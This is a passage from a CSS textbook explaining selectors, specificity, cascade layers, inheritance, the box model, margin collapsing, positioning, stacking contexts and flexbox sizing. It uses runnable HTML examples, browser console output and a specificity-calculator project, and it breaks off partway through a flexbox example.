- Compute a box's size under both `box-sizing` values, and predict margin collapsing.

## Topic 2A — Selecting

## Unit 2.1 — Rules and selectors

**One-line summary:** A CSS rule is a selector and a block of `property: value` declarations; selectors combine type, class, id, attribute, and pseudo-class conditions into compound selectors, and link them with combinators — descendant (space), child (`>`), next sibling (`+`), and subsequent sibling (`~`) — while `:has()` finally lets a selector depend on what an element contains.

```html
<!-- file: selectors/selectors.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Selectors</title></head>
<body>
  <article>
    <h2>Title</h2>
    <p class="lead">First paragraph</p>
    <p>Second <a href="https://example.com/x.pdf">PDF</a> and <a href="/local">local</a></p>
    <blockquote><p>Quoted</p></blockquote>
    <ul><li>one</li><li class="done">two</li><li>three</li><li>four</li></ul>
    <form><input required><input type="checkbox" checked><button disabled>Go</button></form>
  </article>
  <script>
    const show = (sel) => console.log(`${sel.padEnd(28)} -> ${[...document.querySelectorAll(sel)]
      .map((e) => e.tagName.toLowerCase() + (e.className ? "." + e.className : "") +
                  (e.children.length ? "" : `("${e.textContent || e.type}")`)).join(", ") || "(nothing)"}`);
    for (const sel of ["article p", "article > p", "h2 + p", "h2 ~ p", "a[href^='https']",
                       "a[href$='.pdf']", "li:nth-child(odd)", "li:nth-child(2n + 3)",
                       "li:not(.done)", "li:last-child", ":required", ":checked", ":disabled",
                       "p:has(a)", "ul:has(> .done) li:first-child", "p:empty"])
      show(sel);
  </script>
</body>
</html>
```

```console
$ cd selectors && python3 ../../tools/page.py selectors.html
article p                    -> p.lead("First paragraph"), p, p("Quoted")
article > p                  -> p.lead("First paragraph"), p
h2 + p                       -> p.lead("First paragraph")
h2 ~ p                       -> p.lead("First paragraph"), p
a[href^='https']             -> a("PDF")
a[href$='.pdf']              -> a("PDF")
li:nth-child(odd)            -> li("one"), li("three")
li:nth-child(2n + 3)         -> li("three")
li:not(.done)                -> li("one"), li("three"), li("four")
li:last-child                -> li("four")
:required                    -> input("text")
:checked                     -> input("checkbox")
:disabled                    -> button("Go")
p:has(a)                     -> p
ul:has(> .done) li:first-child -> li("one")
p:empty                      -> (nothing)
```

`querySelectorAll` uses the same selector engine as style sheets, so it is the quickest way to test a selector. Note the difference between `article p` (any depth: it includes the quoted paragraph) and `article > p` (children only); `h2 + p` (the immediately following sibling) and `h2 ~ p` (all following siblings); and `:nth-child(2n + 3)`, which matches positions 3, 5, 7… (n = 0, 1, 2…). `:has()` looks *down* (or sideways, with `+` and `~`) from the subject: `p:has(a)` is "a paragraph that contains a link" — the parent selector CSS lacked for 25 years.

### Mastery check

1. **Predict.** Which items does `li:nth-child(-n + 2)` select?
2. **Write.** A selector for a `<label>` whose following sibling input is invalid.

## Topic 2B — The cascade

## Unit 2.2 — Specificity

**One-line summary:** When rules of the same origin, importance, and layer conflict, the one whose selector is more *specific* wins; specificity is a triple (ids, classes/attributes/pseudo-classes, types/pseudo-elements) compared column by column — so one id beats any number of classes — with inline styles above all selectors, and `:where()` contributing nothing while `:is()`, `:not()`, and `:has()` contribute their most specific argument.

```html
<!-- file: cascade/specificity.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Specificity</title>
  <style>
    p                 { color: black; }      /* (0,0,1) */
    .note             { color: blue; }       /* (0,1,0) beats (0,0,1) */
    p.note            { color: green; }      /* (0,1,1) beats (0,1,0) */
    .a.b.c.d.e.f.g.h.i.j.k { color: brown; } /* (0,11,0): eleven classes ... */
    #intro            { color: orange; }     /* (1,0,0) ... lose to one id */
    :where(#intro)    { color: red; }        /* :where() adds nothing: (0,0,0) */
    :is(#x, p).later  { color: navy; }       /* :is() takes its most specific argument: (1,1,0) */
  </style>
</head>
<body>
  <p id="intro" class="note a b c d e f g h i j k">Paragraph 1</p>
  <p class="note">Paragraph 2</p>
  <p class="note later">Paragraph 3</p>
  <p class="note" style="color: teal">Paragraph 4</p>
  <p>Paragraph 5</p>
  <script>
    for (const p of document.querySelectorAll("p"))
      console.log(`${p.textContent}: ${getComputedStyle(p).color}`);
  </script>
</body>
</html>
```

```console
$ cd cascade && python3 ../../tools/page.py specificity.html
Paragraph 1: rgb(255, 165, 0)
Paragraph 2: rgb(0, 128, 0)
Paragraph 3: rgb(0, 0, 128)
Paragraph 4: rgb(0, 128, 128)
Paragraph 5: rgb(0, 0, 0)
```

Paragraph 1 is orange: `#intro` (1,0,0) beats the eleven classes (0,11,0) — the columns are compared left to right, with no carrying. `:where(#intro)` would have been red, but it has specificity (0,0,0). Paragraph 3 is navy because `:is(#x, p).later` counts as (1,1,0) — its most specific argument, `#x`, counts even though that argument does not match. Paragraph 4's inline `style` beats every selector. When specificity is equal, the rule that comes later wins.

### Deep & Tricky

**DT-9. The specificity of `:is()`, `:not()`, and `:has()` is that of their *most specific argument*, whether or not that argument matched — so `:is(#nav, .menu) a` costs (1,0,1) even on elements matched through `.menu`, and is hard to override; `:where()` has the same matching behaviour with zero specificity, which makes it the tool for defaults that should be easy to override.** *(Selectors Level 4 §17 "Calculating a selector's specificity")*

### Mastery check

1. **Calculate.** The specificity of `nav ul li:not(.active) > a[href]::after`.

## Unit 2.3 — Origins, importance, and cascade layers

**One-line summary:** Before specificity is even consulted, the cascade sorts declarations by origin and importance (browser defaults < user styles < author styles, and the order *reverses* for `!important`), then by cascade layer (`@layer`: later layers win, unlayered styles win over all layers — and again the order reverses for `!important`), then by specificity, then by order of appearance.

```html
<!-- file: cascade/layers.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Cascade layers and !important</title>
  <style>
    @layer reset, framework;                       /* declared order: reset < framework */
    @layer framework { #a { color: red; }   .b { color: red; }  .d { color: red !important; } }
    @layer reset     { p  { color: gray; }  .c { color: gray !important; }  .d { color: gray !important; } }
    p { color: green; }                            /* unlayered: beats ANY layered normal rule */
    .c { color: green; }
  </style>
</head>
<body>
  <p id="a">id selector in a layer vs a type selector outside</p>
  <p class="b">class in a later layer vs unlayered type selector</p>
  <p class="c" style="color: blue">!important in the first layer vs inline style</p>
  <p class="d">!important in both layers: which layer wins?</p>
  <script>
    const names = { "rgb(0, 128, 0)": "green", "rgb(255, 0, 0)": "red",
                    "rgb(128, 128, 128)": "gray", "rgb(0, 0, 255)": "blue" };
    for (const p of document.querySelectorAll("p"))
      console.log(`${p.textContent}: ${names[getComputedStyle(p).color]}`);
  </script>
</body>
</html>
```

```console
$ cd cascade && python3 ../../tools/page.py layers.html
id selector in a layer vs a type selector outside: green
class in a later layer vs unlayered type selector: green
!important in the first layer vs inline style: gray
!important in both layers: which layer wins?: gray
```

- An id selector inside a layer loses to a plain `p` outside any layer: the layer comparison comes before specificity, and unlayered styles are treated as the last, strongest layer.
- A class in the later `framework` layer also loses to unlayered styles.
- An `!important` declaration in the *first* layer beats the inline style — important declarations beat all normal ones.
- With `!important` in both layers, the *earlier* layer (`reset`) wins: importance reverses layer order.

Layers make large style sheets manageable: put resets, then third-party CSS, then components, then utilities in layers in that order, and specificity only matters *within* a layer.

### Deep & Tricky

**DT-10. `!important` reverses every ordering of the cascade: user-agent important beats user important beats author important (the opposite of normal declarations), and among layers the *first* declared layer's important declarations win. A reset layer that marks something `!important` therefore cannot be overridden by any later layer's `!important` — only by an important declaration in an even earlier layer or by the user.** *(CSS Cascading and Inheritance Level 5, §6.1 "Cascade Sorting Order" and §6.4 "Cascade Layers": "the order of importance reverses for important declarations")* The reversal is deliberate: it lets low-level layers (and users, for accessibility) protect values that must not change.

### Pattern

**P-3. Declare all cascade layers once, in order, at the top of the main style sheet (`@layer reset, vendor, components, utilities;`), keep selectors flat (one class where possible), and avoid `!important` except for utilities that must always win.** *(Practice; CSS Cascade 5, §6.4)* *Trade-off:* layers interact with unlayered CSS in a way that surprises teams — any old unlayered rule beats every new layered one — so migrate a code base to layers all at once, or put the legacy CSS in a layer of its own.

### Mastery check

1. **Predict.** A rule `@layer base { #x { color: red } }` and an inline `style="color: blue"`: which wins?

## Unit 2.4 — Inheritance and computed values

**One-line summary:** Properties that concern text (`color`, `font-*`, `line-height`, `visibility`…) inherit from the parent by default, while box properties (`border`, `margin`, `width`, `background`…) do not; relative values are resolved in stages — `em` against the parent's font size, `rem` against the root's, `%` against a property-specific reference — and the keywords `inherit`, `initial`, `unset`, and `revert` override the default behaviour.

```html
<!-- file: values/inherit.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Inheritance and computed values</title>
  <style>
    html { font-size: 16px; }
    .card { color: darkslateblue; border: 2px solid; font-size: 20px; width: 400px; padding: 10px; }
    .em  { font-size: 1.5em; }          /* relative to the parent's font size */
    .rem { font-size: 1.5rem; }         /* relative to the root's font size */
    .pct { width: 50%; }                /* percentage of the containing block's width */
    .reset-color   { color: initial; }  /* the property's initial value (black) */
    .inherit-border{ border: inherit; } /* force inheritance of a non-inherited property */
    span { display: block; }             /* author style makes every span a block ... */
    .revert        { display: revert; } /* ... revert goes back to the browser default */
  </style>
</head>
<body>
  <div class="card" id="card">
    <p id="plain">plain paragraph</p>
    <p class="em" id="em">1.5em <span class="em" id="em2">1.5em inside 1.5em</span></p>
    <p class="rem" id="rem">1.5rem</p>
    <p class="pct" id="pct">50% wide</p>
    <p class="reset-color" id="initial">color: initial</p>
    <p class="inherit-border" id="inh">border: inherit</p>
    <span class="revert" id="rev">display: revert</span>
  </div>
  <script>
    const cs = (id) => getComputedStyle(document.getElementById(id));
    console.log(`plain:   color ${cs("plain").color} (inherited), border ${cs("plain").borderTopWidth} (not inherited)`);
    console.log(`em:      ${cs("em").fontSize};  nested em: ${cs("em2").fontSize}`);
    console.log(`rem:     ${cs("rem").fontSize}`);
    console.log(`pct:     width ${cs("pct").width}`);
    console.log(`initial: color ${cs("initial").color}`);
    console.log(`inherit: border ${cs("inh").borderTopWidth} ${cs("inh").borderTopStyle} ${cs("inh").borderTopColor}`);
    console.log(`revert:  display ${cs("rev").display}`);
    console.log(`card border colour is currentColor: ${cs("card").borderTopColor}`);
  </script>
</body>
</html>
```

```console
$ cd values && python3 ../../tools/page.py inherit.html
plain:   color rgb(72, 61, 139) (inherited), border 0px (not inherited)
em:      30px;  nested em: 45px
rem:     24px
pct:     width 200px
initial: color rgb(0, 0, 0)
inherit: border 2px solid rgb(72, 61, 139)
revert:  display inline
card border colour is currentColor: rgb(72, 61, 139)
```

The paragraph inherits the card's colour but not its border. `1.5em` compounds when nested — 20 × 1.5 = 30 px, then 30 × 1.5 = 45 px — which is why `rem` (24 px, always relative to the root) is preferred for font sizes. `width: 50%` is half of the card's content width (400 px). `initial` gives the property's specification default (black for `color`, not the browser's style for that element), `inherit` forces inheritance even for borders, and `revert` rolls back to the browser's own style sheet — `inline` for a `<span>`. A border with no colour uses `currentColor`, the element's own text colour.

### Mastery check

1. **Predict.** `html { font-size: 62.5% }` and `p { font-size: 1.6rem }`. What is the paragraph's font size, assuming the browser default is 16 px?

## Topic 2C — Boxes

## Unit 2.5 — The box model

**One-line summary:** Every element generates a box of content, padding, border, and margin; with the default `box-sizing: content-box`, `width` sets only the content, so padding and border are added on top, while `border-box` makes `width` the outside of the border — which is why almost every modern style sheet starts with `*, *::before, *::after { box-sizing: border-box; }`.

```html
<!-- file: box/box.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>The box model</title>
  <style>
    body { margin: 0; }
    .box { width: 200px; padding: 20px; border: 5px solid; margin: 10px; }
    #content { box-sizing: content-box; }      /* the default: width is the content only */
    #border  { box-sizing: border-box; }       /* width includes padding and border */
  </style>
</head>
<body>
  <div class="box" id="content">content-box</div>
  <div class="box" id="border">border-box</div>
  <script>
    for (const el of document.querySelectorAll(".box")) {
      const r = el.getBoundingClientRect(), cs = getComputedStyle(el);
      console.log(`${el.id.padEnd(8)} width: ${cs.width.padEnd(6)} offsetWidth ${el.offsetWidth}  clientWidth ${el.clientWidth}  top ${r.top}`);
    }
  </script>
</body>
</html>
```

```console
$ cd box && python3 ../../tools/page.py box.html
content  width: 200px  offsetWidth 250  clientWidth 240  top 10
border   width: 200px  offsetWidth 200  clientWidth 190  top 88
```

The content-box element is 200 + 2 × 20 + 2 × 5 = 250 px wide on screen (`offsetWidth`, including the border); `clientWidth` (content and padding) is 240. The border-box element is exactly 200 px. The second box's top is 88 px, not 98: the 10-px bottom margin of the first and the 10-px top margin of the second overlap — margin collapsing.

## Unit 2.6 — Margin collapsing and formatting contexts

**One-line summary:** In normal block layout, adjacent vertical margins collapse into the larger of the two — between siblings, and between a parent and its first or last child when no border, padding, or content separates them; margins never collapse inside flex or grid containers, or across the boundary of a new block formatting context such as `display: flow-root`.

```html
<!-- file: box/collapse.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Margin collapsing</title>
  <style>
    body { margin: 0; }
    section { background: #eee; }
    h2 { margin: 30px 0; }
    p  { margin: 20px 0; }
    .flow-root { display: flow-root; }          /* a new block formatting context */
    .flex { display: flex; flex-direction: column; }
  </style>
</head>
<body>
  <section id="s1"><h2 id="h1">Heading</h2><p id="p1">Paragraph</p></section>
  <section id="s2" class="flow-root"><h2 id="h2">Heading</h2><p id="p2">Paragraph</p></section>
  <section id="s3" class="flex"><h2 id="h3">Heading</h2><p id="p3">Paragraph</p></section>
  <script>
    const topOf = (id) => document.getElementById(id).getBoundingClientRect().top;
    const bottomOf = (id) => document.getElementById(id).getBoundingClientRect().bottom;
    for (const n of [1, 2, 3])
      console.log(`section ${n} (${getComputedStyle(document.getElementById("s" + n)).display.padEnd(9)}): ` +
        `heading starts ${topOf("h" + n) - topOf("s" + n)}px below the section top; ` +
        `gap heading->paragraph ${topOf("p" + n) - bottomOf("h" + n)}px`);
  </script>
</body>
</html>
```

```console
$ cd box && python3 ../../tools/page.py collapse.html "eval:document.getElementById('s1').getBoundingClientRect().top"
section 1 (block    ): heading starts 0px below the section top; gap heading->paragraph 30px
section 2 (flow-root): heading starts 30px below the section top; gap heading->paragraph 30px
section 3 (flex     ): heading starts 30px below the section top; gap heading->paragraph 50px
=> 30
```

In the first section, the heading's 30-px top margin collapses *through* the section: the heading sits at the section's top edge, and the section itself was pushed 30 px down the page (the final line). The gap between heading and paragraph is 30 px, not 30 + 20. `display: flow-root` creates a new block formatting context: the parent contains its children's margins, but sibling margins still collapse. In a flex container nothing collapses: 30 + 20 = 50.

### Deep & Tricky

**DT-11. A child's top margin can escape its parent: when a block has no top border, padding, or inline content before its first child, the first child's margin collapses with the parent's and appears *outside* the parent — moving the parent's background down with it, so "margin-top on the heading moved the whole section" is correct behaviour, not a bug. Padding, a border, `display: flow-root`, or flex/grid layout on the parent prevents it.** *(CSS 2.2 §8.3.1 "Collapsing margins"; CSS Display Level 3 §2.3, `flow-root`)* (The helpers in this example are called `topOf` and `bottomOf`. The first version called one of them `top`, and the script failed with "Identifier 'top' has already been declared" — Chapter 5 explains why, in DT-20.)

### Mastery check

1. **Predict.** Two siblings have margins `margin-bottom: 40px` and `margin-top: -10px`. What is the gap?

## Chapter 2 Project — A specificity calculator, checked against the browser

### Requirements

Write a JavaScript module that computes the specificity of any selector used in this chapter — ids, classes, attribute selectors, pseudo-classes, pseudo-elements (including legacy single-colon forms), type and universal selectors, combinators, and the special forms `:is()`, `:not()`, `:has()`, `:where()`, and `:nth-child(An+B of S)`. Then check it against the browser: for every ordered pair of 25 selectors that all match the same element, put both in a style sheet, let the browser's cascade choose, and compare with your calculator's prediction. Pages that use modules must be loaded over HTTP, so serve them with Chapter 0's static server.

### Reference solution

```js
// file: project/specificity.js
// Compute the specificity of a CSS selector as [ids, classes, types] (Selectors Level 4, §17).
// Handles compound and complex selectors, attribute selectors, pseudo-classes, pseudo-elements,
// and the special rules for :is(), :not(), :has(), :nth-child(... of S) and :where().

function splitTopLevel(text, separator = ",") {      // split on commas outside parentheses
  const parts = [];
  let depth = 0, start = 0, quote = null;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (quote) { if (c === quote) quote = null; continue; }
    if (c === '"' || c === "'") quote = c;
    else if (c === "(" || c === "[") depth++;
    else if (c === ")" || c === "]") depth--;
    else if (c === separator && depth === 0) { parts.push(text.slice(start, i)); start = i + 1; }
  }
  parts.push(text.slice(start));
  return parts.map((p) => p.trim());
}

const add = (a, b) => [a[0] + b[0], a[1] + b[1], a[2] + b[2]];
const greater = (a, b) => a[0] - b[0] || a[1] - b[1] || a[2] - b[2];
const maxOf = (list) => list.map(specificity).reduce((m, s) => (greater(s, m) > 0 ? s : m), [0, 0, 0]);

function readParens(sel, i) {                         // sel[i] === "(": return [inside, index after ")"]
  let depth = 0, j = i;
  for (; j < sel.length; j++) {
    if (sel[j] === "(") depth++;
    else if (sel[j] === ")" && --depth === 0) break;
  }
  return [sel.slice(i + 1, j), j + 1];
}

export function specificity(selector) {
  let s = [0, 0, 0], i = 0;
  const sel = selector.trim();
  const ident = () => { const m = /^-?[_a-zA-Z -￿][-\w -￿]*/.exec(sel.slice(i)); i += m ? m[0].length : 0; return m?.[0] ?? ""; };
  while (i < sel.length) {
    const c = sel[i];
    if (c === "#") { i++; ident(); s = add(s, [1, 0, 0]); }
    else if (c === ".") { i++; ident(); s = add(s, [0, 1, 0]); }
    else if (c === "[") { i = sel.indexOf("]", i) + 1; s = add(s, [0, 1, 0]); }
    else if (c === ":" && sel[i + 1] === ":") { i += 2; ident(); if (sel[i] === "(") i = readParens(sel, i)[1]; s = add(s, [0, 0, 1]); }
    else if (c === ":") {
      i++;
      const name = ident().toLowerCase();
      let arg = null;
      if (sel[i] === "(") [arg, i] = readParens(sel, i);
      if (["before", "after", "first-line", "first-letter"].includes(name)) s = add(s, [0, 0, 1]);   // legacy pseudo-elements
      else if (name === "where") { /* contributes nothing */ }
      else if (["is", "not", "has", "matches"].includes(name)) s = add(s, maxOf(splitTopLevel(arg)));
      else if (["nth-child", "nth-last-child"].includes(name) && / of /i.test(arg))
        s = add(add(s, [0, 1, 0]), maxOf(splitTopLevel(arg.split(/ of /i)[1])));
      else s = add(s, [0, 1, 0]);                       // any other pseudo-class
    }
    else if (c === "*") i++;                            // universal selector: nothing
    else if (/[\s>+~]/.test(c)) i++;                    // combinators: nothing
    else if (ident()) s = add(s, [0, 0, 1]);            // type selector
    else throw new SyntaxError(`cannot parse ${JSON.stringify(sel)} at ${i}`);
  }
  return s;
}

export { greater };
```

```html
<!-- file: project/check.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Specificity, checked against the browser</title></head>
<body>
  <main id="m" class="x">
    <section class="s">
      <p id="t" class="a b" data-k="v" lang="en">Target</p>
      <p class="c">Sibling</p>
    </section>
  </main>
  <script type="module">
    import { specificity, greater } from "./specificity.js";
    const pool = ["p", "#t", ".a", ".a.b", "p.a", "main p", "#m p", "[data-k]", "p[data-k=v]",
      ":is(#t, p)", ":where(#t)", ":where(#m) .a", ":not(.zzz)", ":not(#zz)", "section > p",
      "p:first-child", ":nth-child(1 of .a)", "*", "body *", "section:has(> .c) p",
      "#m .s > .a", ":is(.a, #t).b", "p:not(.c, #z)", "p:lang(en)", "html body main section p"];
    const target = document.getElementById("t");
    for (const sel of pool) if (!target.matches(sel)) throw new Error(`${sel} does not match`);
    const style = document.createElement("style");
    document.head.append(style);
    let checked = 0, wrong = 0;
    for (const first of pool) for (const second of pool) {
      if (first === second) continue;
      style.textContent = `${first} { color: rgb(1, 0, 0); } ${second} { color: rgb(2, 0, 0); }`;
      const browser = getComputedStyle(target).color === "rgb(1, 0, 0)" ? first : second;
      const ours = greater(specificity(first), specificity(second)) > 0 ? first : second;  // tie: later wins
      checked++;
      if (browser !== ours) { wrong++; console.log(`MISMATCH: ${first} vs ${second}`); }
    }
    console.log(`${checked} pairs checked, ${wrong} disagreements with the browser`);
    for (const sel of [":is(.a, #t).b", ":where(#m) .a", ":nth-child(1 of .a)", "section:has(> .c) p", "p::before"])
      console.log(`${sel.padEnd(22)} (${specificity(sel).join(",")})`);
  </script>
</body>
</html>
```

```console
$ cd project && python3 ../../tools/page.py http://localhost:8084/check.html --serve "node ../../ch00/project/static.mjs . 8084"
600 pairs checked, 0 disagreements with the browser
:is(.a, #t).b          (1,1,0)
:where(#m) .a          (0,1,0)
:nth-child(1 of .a)    (0,2,0)
section:has(> .c) p    (0,1,2)
p::before              (0,0,2)
```

All 600 ordered pairs agree with the browser. Ties are decided by order (the second rule wins), which the test also exercises, because each pair is tried in both orders.

### Review checklist

- Which selectors in the pool have equal specificity? Check that the test covers ties in both orders.
- Add `:host()`, `::slotted()`, and `:nth-of-type()`. What do the specifications say they count?
- Why does the page fail when opened as a `file://` URL? (Chapter 9, Unit 9.1.)

## Answers to the Chapter 2 prediction questions

**Unit 2.1, Q1.** The first two: −n + 2 ≥ 1 for n = 0 and 1. **Q2.** You cannot select a preceding sibling with `+`, so use `:has()`: `label:has(+ input:invalid)`.

**Unit 2.2, Q1.** Types `nav`, `ul`, `li`, `a` → 4; `:not(.active)` → its argument, 1 class; `[href]` → 1 class; `::after` → 1 type: (0,2,5).

**Unit 2.3, Q1.** The inline style: both are normal declarations, and inline styles beat all selector-based author declarations, layered or not.

**Unit 2.4, Q1.** 62.5% of 16 px = 10 px root; 1.6 rem = 16 px.

**Unit 2.6, Q1.** With one positive and one negative margin, they are added: 40 − 10 = 30 px.

# Chapter 3 — Layout: Flow, Positioning, Flexbox, Grid, and Responsive Design

*Goal: predict where every box goes. You will measure normal flow and the four kinds of positioning, see why a `z-index` of 9999 can lose, compute flex item sizes by hand and match the browser to the fraction of a pixel, fall into (and climb out of) the `min-width: auto` trap, build grids with `fr`, `minmax()`, `auto-fill`, and named areas, and make layouts fluid with `clamp()`, `min()`, and media queries. The project is a responsive application shell that checks its own layout at three screen sizes.*

**What you will be able to do after this chapter**

- Explain normal flow, the containing block, and static, relative, absolute, fixed, and sticky positioning.
- Explain stacking contexts and debug "z-index does not work".
- Compute how flexbox distributes free space and removes overflow.
- Design two-dimensional layouts with CSS Grid tracks and areas.
- Build layouts that adapt to any width with intrinsic sizing, fluid values, and few breakpoints.

## Topic 3A — Flow and positioning

## Unit 3.1 — Positioning and the containing block

**One-line summary:** Boxes are laid out in normal flow — blocks stack vertically, inline content flows in lines — unless positioned: `relative` shifts a box visually while it keeps its place in the flow, `absolute` removes it from the flow and places it against its *containing block* (the nearest positioned ancestor, or the initial containing block), `fixed` places it against the viewport, and `sticky` keeps it in the flow until scrolling would move it past a threshold.

```html
<!-- file: flow/position.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Positioning and containing blocks</title>
  <style>
    body { margin: 0; height: 2000px; }
    .outer { margin: 50px; width: 300px; height: 200px; }
    #rel-parent { position: relative; }
    .abs { position: absolute; top: 10px; left: 10px; width: 50px; height: 50px; }
    .rel { position: relative; top: 20px; left: 80px; }
    .fixed { position: fixed; bottom: 0; right: 0; width: 100px; height: 20px; }
    .sticky { position: sticky; top: 0; height: 20px; }
  </style>
</head>
<body>
  <div class="outer" id="static-parent"><div class="abs" id="abs1"></div></div>
  <div class="outer" id="rel-parent"><div class="abs" id="abs2"></div><div class="rel" id="rel">rel</div></div>
  <div class="fixed" id="fixed"></div>
  <div class="outer"><div class="sticky" id="sticky">sticky</div></div>
  <script>
    const at = (id) => { const r = document.getElementById(id).getBoundingClientRect();
                         return `(${r.left}, ${r.top})`; };
    const report = (label) => console.log(`${label}: abs1 ${at("abs1")}  abs2 ${at("abs2")}  ` +
      `rel ${at("rel")}  fixed ${at("fixed")}  sticky ${at("sticky")}`);
    report("scrollY 0  ");
    scrollTo(0, 600);
    report("scrollY 600");
  </script>
</body>
</html>
```

```console
$ cd flow && python3 ../../tools/page.py position.html
scrollY 0  : abs1 (10, 10)  abs2 (60, 310)  rel (130, 320)  fixed (700, 580)  sticky (50, 550)
scrollY 600: abs1 (10, -590)  abs2 (60, -290)  rel (130, -280)  fixed (700, 580)  sticky (50, 0)
```

`abs1`'s parent is not positioned, so its `top: 10px; left: 10px` is measured from the page itself, (10, 10). `abs2`'s parent is `position: relative`, so it lands 10 px inside that parent at (50 + 10, 300 + 10). The relatively positioned `rel` is drawn 80 px right and 20 px down from where flow put it (the parent's corner, since `abs2` takes no space) — and the content after it does not move. After scrolling 600 px, everything moves up by 600 except the fixed box, which stays in the viewport corner, and the sticky one, which stops at `top: 0` while its parent is still on screen.

## Unit 3.2 — Stacking contexts

**One-line summary:** `z-index` orders positioned boxes only *within the same stacking context*; elements create a new stacking context when they are positioned with a `z-index`, or have `opacity` below 1, a `transform`, `filter`, `isolation: isolate`, and several other properties — and nothing inside a stacking context can ever be painted above something that the context as a whole is below.

```html
<!-- file: flow/stacking.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Stacking contexts</title>
  <style>
    body { margin: 0; }
    .card { position: relative; width: 200px; height: 100px; }
    .faded { opacity: 0.99; }                      /* opacity < 1 creates a stacking context */
    .menu  { position: absolute; top: 50px; left: 20px; width: 150px; height: 120px; z-index: 9999; }
    .next  { position: relative; z-index: 1; width: 200px; height: 100px; }
  </style>
</head>
<body>
  <div class="card" id="c1"><div class="menu" id="m1"></div></div>
  <div class="next" id="n1"></div>
  <div class="card faded" id="c2"><div class="menu" id="m2"></div></div>
  <div class="next" id="n2"></div>
  <script>
    // Which element is on top at a point covered by both the menu and the next box?
    for (const [menu, next] of [["m1", "n1"], ["m2", "n2"]]) {
      const r = document.getElementById(next).getBoundingClientRect();
      const top = document.elementFromPoint(r.left + 50, r.top + 30);
      console.log(`menu ${menu} has z-index 9999; on top at the overlap: #${top.id}`);
    }
  </script>
</body>
</html>
```

```console
$ cd flow && python3 ../../tools/page.py stacking.html
menu m1 has z-index 9999; on top at the overlap: #m1
menu m2 has z-index 9999; on top at the overlap: #n2
```

Both menus have `z-index: 9999` and overlap the next box, whose `z-index` is 1. The first menu wins: its card creates no stacking context, so the menu competes directly with `#n1`. The second card has `opacity: 0.99`, which makes it a stacking context with `z-index: auto` (treated as 0) — the whole card, menu included, is painted as one layer *below* `#n2`, and 9999 only orders the menu among the card's own children.

### Deep & Tricky

**DT-12. `z-index` values are not global: they are compared only between siblings in the same stacking context, and many properties unrelated to stacking create one — `opacity` < 1, `transform`, `filter`, `will-change`, `contain: paint`, `mix-blend-mode`, and `position: fixed` or `sticky`. Adding a fade-in animation (opacity) or a transform to a card can therefore make its dropdown menu disappear behind the next card. The fix is to raise the *context* (give the card itself a `z-index` while the menu is open), or to render the menu outside the card — today with the `popover` attribute or `<dialog>`, which use the browser's top layer, above every stacking context.** *(CSS 2.2 Appendix E "Elaborate description of Stacking Contexts"; CSS Positioned Layout Level 3 §4; HTML Living Standard, "the top layer")*

### Mastery check

1. **Predict.** In the second case, what happens if you give `.faded` the style `z-index: 2`?

## Topic 3B — Flexbox

## Unit 3.3 — How flex items are sized

**One-line summary:** Each flex item starts at its `flex-basis`; if the line has space left over, it is shared in proportion to `flex-grow`; if the items overflow, the excess is removed in proportion to `flex-shrink` *multiplied by the basis*, so large items shrink more — and `flex: 1` means `1 1 0%`, while `flex: auto` means `1 1 auto`.

```html
<!-- file: flex/flex.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>How flex items get their sizes</title>
  <style>
    body { margin: 0; font: 16px/1.2 sans-serif; }
    .row { display: flex; width: 600px; }
    .row > div { box-sizing: border-box; min-width: 0; }
    /* grow: 100 px of free space shared 1 : 3 */
    #grow .a { flex: 1 1 100px; }  #grow .b { flex: 3 1 100px; }  #grow .c { flex: 0 1 300px; }
    /* shrink: 200 px too much, removed in proportion to shrink x basis */
    #shrink .a { flex: 0 1 200px; } #shrink .b { flex: 0 1 300px; } #shrink .c { flex: 0 2 300px; }
  </style>
</head>
<body>
  <div class="row" id="grow"><div class="a">a</div><div class="b">b</div><div class="c">c</div></div>
  <div class="row" id="shrink"><div class="a">a</div><div class="b">b</div><div class="c">c</div></div>
  <script>
    for (const row of document.querySelectorAll(".row"))
      console.log(`${row.id.padEnd(6)} ` + [...row.children]
        .map((d) => `${d.className}=${d.getBoundingClientRect().width}px`).join("  "));
  </script>
</body>
</html>
```

```console
$ cd flex && python3 ../../tools/page.py flex.html
grow   a=125px  b=175px  c=300px
shrink a=163.640625px  b=245.453125px  c=190.90625px
```

**Worked example — growing.** Bases 100 + 100 + 300 = 500 in a 600-px row: 100 px free. Grow factors 1 : 3 : 0 (total 4), so `a` gets 25 and `b` 75: widths 125, 175, 300. ✓

**Worked example — shrinking.** Bases 200 + 300 + 300 = 800: 200 px too wide. The shrink weight is shrink × basis: 1 × 200 = 200, 1 × 300 = 300, 2 × 300 = 600, total 1,100. Each item loses 200 × weight / 1,100:

| Item | Weight | Loses | Width |
| --- | --- | --- | --- |
| a | 200 | 200 × 200 / 1100 = 36.36 | 163.64 |
| b | 300 | 200 × 300 / 1100 = 54.55 | 245.45 |
| c | 600 | 200 × 600 / 1100 = 109.09 | 190.91 |

The browser's widths match to the rounding of its 1/64-pixel layout units.

## Unit 3.4 — The `min-width: auto` trap

**One-line summary:** A flex item's minimum width defaults to `auto`, which means "the width of its longest unbreakable content", so a flex item containing a long word, a URL, a `<pre>`, or `white-space: nowrap` text refuses to shrink and overflows its container; `min-width: 0` (or `overflow: hidden`) removes the floor.

```html
<!-- file: flex/minwidth.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>The min-width: auto trap</title>
  <style>
    body { margin: 0; font: 16px/1.2 monospace; }
    .row { display: flex; width: 300px; outline: 1px solid; }
    .icon { flex: none; width: 50px; }
    .text { flex: 1; }
    .fixed .text { min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .long  { white-space: nowrap; }
  </style>
